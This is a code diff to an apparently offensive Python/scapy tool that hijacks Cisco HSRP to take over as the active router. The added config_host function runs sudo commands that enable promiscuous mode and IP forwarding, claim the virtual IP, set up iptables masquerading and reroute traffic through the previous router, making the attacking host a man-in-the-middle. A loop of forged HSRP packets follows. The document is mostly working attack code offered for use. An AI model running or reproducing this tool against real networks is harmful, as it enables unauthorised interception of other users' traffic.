@@ -19,9 +19,10 @@ Functions:
 '''
 
 from scapy.all import *
-from argparse import ArgumentParser, Action
+from argparse import ArgumentParser
 from colorama import init, Fore
 from ipaddress import IPv4Address
+import os
 
 # coloura initialization
 init()
@@ -38,6 +39,7 @@ class Packet:
     port = 1985
     multicast_ip = '224.0.0.2' 
     auth = 'cisco'
+    prev_active = '0.0.0.0'
     src_ip = '10.10.3.20'
     virtual_ip = '10.10.3.1'
     priority = 255
@@ -54,6 +56,7 @@ def args():
     
     subparser = parser.add_subparsers(dest='command')
     takeover = subparser.add_parser('takeover', help='Hijack HSRP and takeover as active router')
+    takeover.add_argument('--prev_active', nargs='?', type=str, required=True, help='Set the IP address of the previous active router')
     takeover.add_argument('--version', nargs='?', type=int, const=1, default=1, help="Sets the HSRP version. Default is 1")
     takeover.add_argument('--src_ip', nargs='?', type=str, help='Set the source IP address of malicious HSRP packet')
     takeover.add_argument('--group', nargs='?', type=int, help='Set group of HSRP that will be attacked')
@@ -82,7 +85,7 @@ def check_vulnerable(pkt):
     return False
 
 
-
+# display details of HSRP if present and is vulnerable
 def process_pkt(pkt):
     if pkt.haslayer(HSRP):
         # if state of HSRP is Active and its vulnerable
@@ -99,6 +102,21 @@ def process_pkt(pkt):
         return ""
     
 
+# set up the attacking machine as the Man-in-the-Middle
+#   1. enable traffic routing on attacking machine 
+#   2. opens a second network interface with the IP address of the virtual IP so traffic will route back to attacking machine
+#   3. set up well-known source NAT to intercept all traffic
+#   4. route all traffic to original active router so traffic will still be able to route out
+def config_host(pkt):
+    print(f"{GREEN}[+] {RESET} Configuring attacking machine as MiTM")
+    os.system('sudo ip link set eth0 promisc on')
+    os.system('sudo sysctl -w net.ipv4.ip_forward=1')
+    os.system(f'sudo ifconfig eth0:1 {pkt.virtual_ip} netmask 255.255.255.0')
+    os.system('sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
+    os.system('sudo ip route flush 0/0')
+    os.system(f'sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw {pkt.prev_active}')
+
+
 
 # attempt to take over as Active HSRP router
 def hsrp_v1(pkt):
@@ -108,14 +126,12 @@ def hsrp_v1(pkt):
     print(f"{GREEN} [+] {RESET} Attempting HSRP takeover")
     send(ip/udp/hsrp, iface='eth0', inter=3, loop=1)
 
-    # maybe can multithread run sniff_network() function to check if active router is attacker? can do later
-
 
 
 def main():
     arg = args()
     mal_pkt = Packet()
-
+    
     if arg.sniff:
         sniff_network()
     elif arg.command == 'takeover':
@@ -123,6 +139,8 @@ def main():
             if arg.src_ip != None: mal_pkt.src_ip = arg.src_ip
             if arg.group != None: mal_pkt.group = arg.group
             if arg.auth != None: mal_pkt.auth = arg.auth
+            if arg.prev_active != None: mal_pkt.prev_active = arg.prev_active
+            config_host(mal_pkt)
             hsrp_v1(mal_pkt)
         elif arg.version == 2:
             print("currently not supported")
